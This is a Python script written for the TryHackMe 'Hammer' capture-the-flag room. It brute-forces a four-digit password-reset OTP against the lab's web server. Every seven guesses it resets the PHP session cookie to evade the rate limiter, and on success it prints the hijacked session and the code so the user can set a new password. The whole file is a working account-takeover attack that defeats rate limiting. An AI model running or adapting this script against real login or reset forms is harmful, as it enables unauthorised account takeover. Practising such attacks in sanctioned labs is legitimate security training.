"""
For TryHackMe Hammer challenge
https://tryhackme.com/room/hammer

Really quick and intuitive OTP brute forcer using requests.
Goes through 10 000 combinations in 60 seconds.

On success, replace the browser cookie and refresh to reach the new password part.
"""

import requests
import time # just for fun

TARGET_IP = "10.10.249.252" # CHANGE THIS
EMAIL = "tester@hammer.thm"
TARGET_PORT = 1337

BASE_URL = f"http://{TARGET_IP}:{str(TARGET_PORT)}"
RESET_URL = f"{BASE_URL}/reset_password.php"
HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
}

session = requests.Session()

def get_php_session():
    # clears and updates session to avoid rate limiter
    session.cookies.clear()
    data = {"email": EMAIL}
    response = session.post(RESET_URL, data=data, headers=HEADERS)

    return session.cookies.get('PHPSESSID')

def submit_otp(recovery_code):
    data = {"recovery_code": recovery_code, "s": "180"}
    response = session.post(RESET_URL, data=data, headers=HEADERS)

    return response

def brute_force_otp():

    tic = time.perf_counter()
    for i in range(10000):
        otp = f"{i:04d}"

        if i % 7 == 0:
            # reset session
            php_session = get_php_session()

        response = submit_otp(otp)

        if not "Invalid or expired" in response.text:
            toc = time.perf_counter()
            #print(r.text)
            print(f"Success!")
            print(f"Session: {php_session}")
            print(f"OTP: {otp}")

            # statistics
            print(f"Tried {i} OTPs {toc - tic:0.4f} seconds")
            print(f"Expected time to try 10000 is {10000*(toc - tic)/(i+1):0.4f} seconds")
            break
        else:
            if i % 100 == 0:
                print(f"Tried OTP: {otp}")

if __name__ == "__main__":
    brute_force_otp()